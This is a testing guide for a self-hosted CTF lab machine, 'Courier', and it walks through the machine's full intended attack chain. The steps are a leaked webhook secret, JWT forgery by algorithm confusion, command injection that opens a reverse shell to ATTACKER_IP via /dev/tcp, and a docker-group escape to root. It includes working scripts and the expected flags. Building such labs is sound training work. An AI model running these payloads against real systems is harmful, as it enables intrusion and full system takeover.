# Testing Guide for Courier HTB Machine

## Prerequisites

- Ubuntu 22.04 VM (fresh install recommended)
- Root access
- Internet connection (for package installation)

## Step 1: Deploy the Machine

### Option A: From Current Directory

```bash
# Make sure you're in the courier directory
cd courier

# Run deployment script as root
sudo bash DEPLOY.sh
```

### Option B: Manual Setup

```bash
# Copy courier directory to target location
sudo cp -r courier /home/runner/courier

# Run setup script
cd /home/runner/courier
sudo bash system/setup.sh
```

### Verify Deployment

```bash
# Check if service is running
sudo systemctl status courier-web

# Check if web app is accessible
curl http://localhost:3000

# Check if runner user exists and is in docker group
id runner
# Should show: uid=... gid=... groups=... docker

# Check if flags exist
cat /home/runner/user.txt
sudo cat /root/root.txt
```

## Step 2: Test the Attack Chain

### 2.1 Discover Webhook Secret

**Method 1: Browser**
1. Open `http://TARGET_IP:3000` in browser
2. Right-click → View Page Source
3. Look for `main.js` or search for "WEBHOOK_SECRET"
4. Find: `const WEBHOOK_SECRET = 'courier_webhook_secret_2024';`

**Method 2: Command Line**
```bash
curl http://TARGET_IP:3000/main.js | grep WEBHOOK_SECRET
```

**Expected Result:** Secret `courier_webhook_secret_2024` is visible

---

### 2.2 Trigger Webhook and Leak Information

```bash
curl -X POST http://TARGET_IP:3000/webhook/trigger \
  -H "Content-Type: application/json" \
  -d '{
    "secret": "courier_webhook_secret_2024",
    "event": "push",
    "repository": {"name": "internal-app"}
  }'
```

**Expected Result:** Response includes:
- `repoUrl`: `file:///home/runner/git/internal-app.git`
- `publicKey`: RSA public key in PEM format
- Verbose build logs

**Save the public key** for JWT forgery:
```bash
curl -X POST http://TARGET_IP:3000/webhook/trigger \
  -H "Content-Type: application/json" \
  -d '{"secret": "courier_webhook_secret_2024", "event": "push"}' \
  | jq -r '.logs.publicKey' > public_key.pem
```

---

### 2.3 Forge JWT Token (Algorithm Confusion)

**Using Python with PyJWT:**

```python
import jwt
import requests

# Load public key from webhook response
public_key = """-----BEGIN PUBLIC KEY-----
[PASTE PUBLIC KEY HERE]
-----END PUBLIC KEY-----"""

# Forge token with HS256 (algorithm confusion)
payload = {
    "username": "admin",
    "role": "admin",
    "iat": 1234567890
}

# Sign with HS256 using public key as secret
token = jwt.encode(payload, public_key, algorithm="HS256")

print(f"Forged token: {token}")

# Test the token
headers = {"Authorization": f"Bearer {token}"}
response = requests.get("http://TARGET_IP:3000/admin/status", headers=headers)
print(response.json())
```

**Using Node.js:**

```javascript
const jwt = require('jsonwebtoken');
const fs = require('fs');

// Load public key
const publicKey = fs.readFileSync('public_key.pem', 'utf8');

// Forge token
const payload = {
    username: 'admin',
    role: 'admin',
    iat: Math.floor(Date.now() / 1000)
};

// Sign with HS256 (algorithm confusion)
const token = jwt.sign(payload, publicKey, { algorithm: 'HS256' });

console.log('Forged token:', token);
```

**Expected Result:** Token is accepted and grants admin access

---

### 2.4 Command Injection via Admin Build

**Set up listener (on attacker machine):**
```bash
nc -lvnp 4444
```

**Send command injection payload:**
```bash
# Replace TOKEN with forged JWT from step 2.3
curl -X POST http://TARGET_IP:3000/admin/build \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{
    "buildCommand": "bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\""
  }'
```

**Or use Python:**
```python
import requests

token = "YOUR_FORGED_TOKEN"
attacker_ip = "10.10.14.5"  # Your IP
attacker_port = "4444"

payload = {
    "buildCommand": f"bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1'"
}

headers = {
    "Authorization": f"Bearer {token}",
    "Content-Type": "application/json"
}

response = requests.post(
    f"http://TARGET_IP:3000/admin/build",
    json=payload,
    headers=headers
)

print(response.json())
```

**Expected Result:** Reverse shell connection as `runner` user

**Verify shell:**
```bash
whoami  # Should output: runner
id      # Should show docker group
pwd     # Should be in /home/runner or similar
```

---

### 2.5 Docker Privilege Escalation

**From the runner shell:**

```bash
# Check docker group membership
groups
# Should show: runner docker

# Method 1: Mount root filesystem
docker run -it -v /:/mnt ubuntu:22.04 chroot /mnt bash

# Method 2: Alternative approach
docker run -it --privileged -v /:/host ubuntu:22.04 chroot /host bash
```

**Expected Result:** Root shell

**Verify root access:**
```bash
whoami  # Should output: root
id      # Should show uid=0(root)
cat /root/root.txt  # Should display root flag
```

---

## Step 3: Verify Flags

### User Flag
```bash
# From runner shell
cat /home/runner/user.txt
# Expected: HTB{webhook_to_jwt_to_rce_to_root}
```

### Root Flag
```bash
# From root shell
cat /root/root.txt
# Expected: HTB{docker_group_escape_complete}
```

## Step 4: Test Stability

### Test After Reboot
```bash
# Reboot the machine
sudo reboot

# After reboot, verify:
sudo systemctl status courier-web  # Should be running
curl http://localhost:3000        # Should respond
```

### Test Docker Cleanup
```bash
# Clean Docker
docker system prune -a

# Verify machine still works
curl http://localhost:3000
# Attack chain should still work
```

### Test Repeatability
1. Complete the entire attack chain
2. Reset the machine (or redeploy)
3. Complete the attack chain again
4. Should work identically both times

## Troubleshooting

### Web App Not Starting
```bash
# Check service status
sudo systemctl status courier-web

# Check logs
sudo journalctl -u courier-web -f

# Check if port is in use
sudo netstat -tlnp | grep 3000

# Restart service
sudo systemctl restart courier-web
```

### JWT Token Not Working
- Verify public key is correct (no extra spaces/newlines)
- Check token format: `Bearer TOKEN`
- Verify algorithm is HS256 (not RS256)
- Check payload has `role: "admin"`

### Command Injection Not Working
- Verify JWT token is valid and has admin role
- Check payload format (proper JSON escaping)
- Try simpler command first: `{"buildCommand": "id"}`
- Check if reverse shell listener is running

### Docker Escape Not Working
- Verify runner user is in docker group: `groups`
- Check Docker is installed: `docker --version`
- Try: `docker ps` (should work without sudo)
- Use full path: `/usr/bin/docker`

## Quick Test Script

Save this as `test_attack.sh`:

```bash
#!/bin/bash

TARGET_IP="${1:-localhost}"
ATTACKER_IP="${2:-10.10.14.5}"

echo "[+] Testing Courier HTB Machine"
echo "[+] Target: $TARGET_IP"
echo ""

# Step 1: Get webhook secret
echo "[1] Testing webhook secret leak..."
SECRET=$(curl -s http://$TARGET_IP:3000/main.js | grep -oP "WEBHOOK_SECRET = '\K[^']+")
if [ -z "$SECRET" ]; then
    echo "[-] Failed to find webhook secret"
    exit 1
fi
echo "[+] Found secret: $SECRET"

# Step 2: Trigger webhook
echo "[2] Triggering webhook..."
RESPONSE=$(curl -s -X POST http://$TARGET_IP:3000/webhook/trigger \
  -H "Content-Type: application/json" \
  -d "{\"secret\": \"$SECRET\", \"event\": \"push\"}")

if echo "$RESPONSE" | grep -q "publicKey"; then
    echo "[+] Webhook triggered, public key leaked"
else
    echo "[-] Webhook failed"
    exit 1
fi

echo ""
echo "[+] Basic tests passed!"
echo "[+] Continue with manual JWT forgery and command injection"
```

Make it executable:
```bash
chmod +x test_attack.sh
./test_attack.sh TARGET_IP
```

## Expected Timeline

- **Deployment:** 5-10 minutes
- **Step 1 (Secret Discovery):** 1 minute
- **Step 2 (Webhook):** 1 minute
- **Step 3 (JWT Forgery):** 5 minutes
- **Step 4 (Command Injection):** 2 minutes
- **Step 5 (Docker Escape):** 1 minute

**Total:** ~15-20 minutes for full exploitation

